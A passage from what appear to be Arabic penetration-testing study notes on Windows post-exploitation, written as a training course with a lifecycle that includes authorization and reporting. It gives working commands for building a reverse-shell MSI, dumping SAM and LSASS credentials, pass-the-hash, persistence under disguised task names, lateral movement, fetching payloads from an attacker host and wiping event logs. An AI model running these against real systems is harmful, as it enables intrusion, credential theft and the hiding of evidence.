- لو قدرت تكتب على `C:\` → تحط `Program.exe` خبيث هناك

```batch
wmic service get name,displayname,pathname,startmode | findstr /i /v '"' | findstr /i /v 'C:\Windows'
:: بيجيبلك كل الخدمات اللي مساراتها مش مقتبسة (وبرّا Windows)
:: findstr /i /v = ابحث بدون Case Sensitivity وعكس النتيجة

sc qc VulnerableService
:: qc = query configuration (اعرض إعدادات الخدمة)

icacls 'C:\Program Files\Vulnerable App'
:: icacls = شوف الصلاحيات على المجلد ده
:: لو فيه Write Permission = ممكن تستغله
```

---

### AlwaysInstallElevated

**الفكرة:** إعداد في الـ Registry لو مفعّل، أي MSI Installer هيتنفذ بصلاحيات SYSTEM!

```batch
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: لازم الاتنين = 0x1 عشان الهجوم يشتغل

:: لو الاتنين 0x1، اعمل MSI خبيث:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o evil.msi

:: على الـ Target:
msiexec /quiet /qn /i C:\Temp\evil.msi
:: /quiet = بدون UI
:: /qn = no user interface
:: /i = install
```

---

### Stored Credentials (Credentials المخزنة)

```batch
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
:: ممكن تلاقي AutoLogon credentials (اسم مستخدم وباسورد مخزنين!)

cmdkey /list
:: بيعرضلك الـ Credentials المحفوظة في الـ Credential Manager
:: لو لقيت حاجة، تقدر تستخدمها بـ runas /savecred

type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
:: PSReadLine = المكون اللي بيحفظ تاريخ أوامر PowerShell
:: ممكن تلاقي أوامر فيها Passwords أو معلومات حساسة
```

---

## 🔷 5.3 — Credential Dumping (تفريغ الـ Credentials)

> **Credential Dumping** = استخراج الـ Hashes وكلمات السر من الجهاز

### SAM Database:

> **SAM** (Security Account Manager — مدير حسابات الأمان) = ملف Windows بيخزن فيه هاشات كلمات سر المستخدمين المحليين

```batch
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SAM C:\Temp\SAM
:: احفظ ملفات SAM و SYSTEM على التير

:: على جهاز المهاجم:
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
:: secretsdump = أداة من Impacket لاستخراج الهاشات
```

### LSASS Memory Dump:

> **LSASS** (Local Security Authority Subsystem Service) = الـ Process المسؤول عن التحقق من الهوية في Windows. بيخزن الـ Credentials في الذاكرة!

```batch
:: اعرف الـ PID بتاع LSASS
tasklist | findstr lsass

:: Method 1: ProcDump
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
:: -ma = full memory dump

:: Method 2: comsvcs.dll (Native Windows — بدون أدوات خارجية!)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
:: rundll32 = أداة Windows لتشغيل الـ DLL functions
:: comsvcs.dll = DLL موجود في كل Windows
```

---

### Pass-the-Hash (تمرير الهاش):

> **Pass-the-Hash** (تمرير الهاش) = استخدام الـ Hash مباشرة للمصادقة بدون كسره. NTLM Authentication بيقبل الهاش نفسه!

```bash
python3 psexec.py DOMAIN/Administrator@192.168.1.50 -hashes :NTLMHASH
# بتدخل على الجهاز بالهاش من غير ما تعرف الباسورد الأصلي!

crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLMHASH
# بتجرب الهاش على كل أجهزة الشبكة
```

---

## 🔷 5.4 — Persistence (الاستمرارية)

> **Persistence** (الاستمرارية) = ضمان إنك تقدر تدخل تاني حتى لو الجهاز اتعمله Restart

### Registry Run Keys:

```batch
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Temp\shell.exe /f
:: HKCU = Current User (ينفذ لما اليوزر ده يلوج)
:: /v = value name (اسم الـ Value)
:: /t REG_SZ = type: String
:: /d = data (المسار)
:: /f = force (من غير سؤال)

:: HKLM = Local Machine (ينفذ لكل اليوزرز — بيحتاج Admin)
```

### Scheduled Task Persistence:

```batch
schtasks /create /sc HOURLY /tn 'MicrosoftUpdate' /tr C:\Temp\shell.exe /ru SYSTEM /f
:: /create = إنشاء Task جديد
:: /sc HOURLY = كل ساعة
:: /tn = task name (اسم مموّه)
:: /tr = task run (الأمر اللي هيتنفذ)
:: /ru SYSTEM = تشغيله بصلاحيات SYSTEM
```

---

## 🔷 5.5 — Lateral Movement (الحركة الجانبية)

> **Lateral Movement** (الحركة الجانبية) = الانتقال من الجهاز اللي دخلته لأجهزة تانية في الشبكة

```batch
:: Native Lateral Movement (بدون أدوات خارجية)
net use \\192.168.1.50\ADMIN$ /user:Administrator P@ssw0rd123
:: net use = ربط شبكي
:: ADMIN$ = الـ Administrative Share الافتراضي

copy C:\Temp\shell.exe \\192.168.1.50\C$\Temp\shell.exe
:: انسخ الـ Shell على الجهاز الثاني

sc \\192.168.1.50 create SvcName binpath= C:\Temp\shell.exe
sc \\192.168.1.50 start SvcName
:: إنشاء وتشغيل Service على الجهاز البعيد
```

```powershell
# PowerShell Remoting (WinRM)
Enter-PSSession -ComputerName 192.168.1.50 -Credential Administrator
# دخل على الجهاز الثاني بـ PowerShell Session تفاعلي

Invoke-Command -ComputerName 192.168.1.50 -Credential Administrator -ScriptBlock { whoami; ipconfig }
# نفّذ أوامر على الجهاز الثاني بدون ما تفتح Session كامل
```

---

## 🔷 5.6 — Data Exfiltration (نقل البيانات)

> **Exfiltration** (التسريب) = نقل البيانات المجموعة من الـ Target لجهاز المهاجم

```batch
:: Download من سيرفر المهاجم (لجلب Tools)
certutil -urlcache -split -f http://192.168.1.100/payload.exe C:\Temp\payload.exe
:: certutil = أداة Windows للشهادات، لكن ممكن تستخدمها للـ Download!
:: -urlcache = تخزين URL
:: -split = تقسيم الملف

powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/file.exe','C:\Temp\file.exe')"
:: Net.WebClient = كلاس .NET للتواصل مع الويب
```

**أماكن البيانات الحساسة على Windows:**

```batch
dir C:\Users\*\Desktop /s /b
:: كل الـ Desktops
:: /s = subfolders
:: /b = bare (أسماء بس)

findstr /si 'password passwd pwd' C:\*.ini C:\*.config C:\*.xml
:: ابحث عن كلمة password في كل الملفات
:: /s = subdirectories
:: /i = ignore case
```

---

## 🔷 5.7 — Clearing Tracks (محو الآثار)

> **Clearing Tracks** (محو الآثار) = إزالة الأدلة على وجودك بعد انتهاء الـ Test

```batch
:: مسح الـ Event Logs
wevtutil cl Security
wevtutil cl System
:: wevtutil = Windows Events Utility
:: cl = clear log

:: مسح كل الـ Logs دفعة واحدة (PowerShell)
Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName }

:: حذف الملفات اللي عملتها
del /f /q C:\Temp\shell.exe C:\Temp\lsass.dmp

:: حذف الـ Scheduled Tasks
schtasks /delete /tn MicrosoftUpdate /f

:: حذف اليوزر المضاف
net user hacker /delete
```

---

# 📊 Methodology Summary — الـ Pentest Lifecycle الكامل

```
1️⃣  Pre-Engagement     → عقد + إذن مكتوب + Scope + ROE
          ↓
2️⃣  Passive Recon      → WHOIS, DNS, Shodan, Google Dorks, Email Harvesting
          ↓
3️⃣  Active Recon       → Nmap, enum4linux, Banner Grabbing, SMB Enum
          ↓
4️⃣  Vuln Scanning (Manual)  → NSE Scripts, Searchsploit, Nikto, Gobuster
          ↓
5️⃣  Vuln Scanning (Auto)    → Nessus Scan → Critical/High Findings
          ↓
6️⃣  Exploitation       → Metasploit / Manual → Initial Access
          ↓
7️⃣  Post-Exploitation  → Situational Awareness → Privesc → Creds
          ↓
8️⃣  Lateral Movement   → PsExec / WMI / WinRM → Next Target
          ↓
9️⃣  Persistence        → Registry / Tasks / Hidden User
          ↓
🔟  Exfiltration        → certutil / PowerShell / SMB
          ↓
1️⃣1️⃣ Clearing Tracks   → Logs / Files / Users / Tasks
          ↓
1️⃣2️⃣ Reporting         → CVSS Scoring + Evidence + Remediation
```

---

# 📝 ملخص سريع للملف كله

|الـ Chapter|موضوعه|أهم حاجة فيه|
|---|---|---|
|**Ch.1**|Network Fundamentals|OSI Model، TCP Handshake، البورتات الخطيرة|
|**Ch.2**|Information Gathering|Passive vs Active Recon، Nmap، SMB Enum|
|**Ch.3**|Vulnerability Scanning|Searchsploit، Nessus، NSE Scripts|
|**Ch.4**|Exploitation|Metasploit Workflow، Payloads، msfvenom|
|**Ch.5**|Post-Exploitation|Privesc، Credential Dumping، Persistence|

**الرابط بين كل حاجة:**

> كل مرحلة بتبني على اللي قبلها → Network Fundamentals بتفهمك الـ Ports والـ Protocols → Recon بتلاقي الـ Services → Vuln Scanning بتلاقي الثغرات → Exploitation بتستغلها → Post-Exploitation بتوسع الوصول → Reporting بتوثق كل حاجة